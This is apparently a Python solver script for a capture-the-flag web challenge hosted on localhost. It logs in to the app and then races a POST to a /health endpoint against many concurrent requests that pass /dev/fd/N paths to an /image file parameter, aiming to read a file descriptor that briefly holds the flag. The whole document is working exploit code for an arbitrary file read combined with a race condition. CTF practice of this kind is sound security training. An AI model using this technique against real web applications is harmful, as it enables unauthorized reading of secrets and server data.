#!/usr/bin/env python3
import asyncio
import sys
import aiohttp

BASE_URL      = "http://localhost:3000"
USERNAME      = "solver_race"
PASSWORD      = "Solver123!"
FD_RANGE      = range(3, 31)
RACE_ATTEMPTS = 20


async def setup(session: aiohttp.ClientSession) -> None:
    await session.post(f"{BASE_URL}/register", data={
        "username": USERNAME,
        "password": PASSWORD,
        "password2": PASSWORD,
    })
    resp = await session.post(f"{BASE_URL}/login", data={
        "username": USERNAME,
        "password": PASSWORD,
    }, allow_redirects=True)
    if "/gallery" not in str(resp.url):
        print("[-] Login failed - check credentials or server")
        sys.exit(1)
    print("[+] Authenticated")


async def probe_fd(session: aiohttp.ClientSession, n: int) -> tuple[int, str] | None:
    try:
        async with session.get(
            f"{BASE_URL}/image",
            params={"file": f"/dev/fd/{n}"},
            allow_redirects=False,
        ) as resp:
            if resp.status == 200:
                text = await resp.text()
                return (n, text.strip())
    except Exception:
        pass
    return None


async def race_once(session: aiohttp.ClientSession) -> str | None:
    async def trigger_health():
        try:
            async with session.post(f"{BASE_URL}/health") as r:
                await r.read()
        except Exception:
            pass

    health_task = asyncio.create_task(trigger_health())
    await asyncio.sleep(0.08)

    results = await asyncio.gather(*[probe_fd(session, n) for n in FD_RANGE])
    await health_task

    flag = None
    for entry in results:
        if entry is None:
            continue
        fd, content = entry
        preview = content[:60].replace("\n", "\\n")
        marker = " <-- FLAG" if "ECSC{" in content else ""
        print(f"    fd/{fd:>2}: {preview}{marker}")
        if "ECSC{" in content:
            flag = content

    return flag


async def main() -> None:
    connector = aiohttp.TCPConnector(limit=64)
    async with aiohttp.ClientSession(connector=connector) as session:
        await setup(session)

        for attempt in range(1, RACE_ATTEMPTS + 1):
            print(f"\n[*] Race attempt {attempt}/{RACE_ATTEMPTS}")
            flag = await race_once(session)
            if flag:
                print(f"\n[+] FLAG: {flag}\n")
                return

        print("\n[-] Failed to capture the flag - try increasing RACE_ATTEMPTS or FD_RANGE")


if __name__ == "__main__":
    asyncio.run(main())
